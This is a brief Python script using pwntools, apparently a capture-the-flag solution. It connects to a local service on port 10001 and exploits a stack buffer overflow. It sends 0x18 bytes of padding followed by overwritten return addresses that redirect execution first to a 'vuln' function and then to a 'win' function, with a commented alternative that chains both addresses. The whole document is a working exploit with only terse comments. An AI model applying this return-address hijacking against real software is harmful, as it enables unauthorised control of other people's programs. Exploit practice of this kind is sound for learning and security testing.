from pwn import *


p=remote("localhost",10001)

win=0x00000000004013e0
vuln=0x0000000000401481
p.sendline(b"a"*0x18+p64(vuln))  # win+77 & 0xff gets the first byte of the adress we want to jump to 

p.sendline(b"a"*0x18+p64(win)) # we overflow again (now restart is 2) to win

#another way to do it 
#p.sendline(b"a"*0x18+p64(vuln)+p64(win))


p.interactive()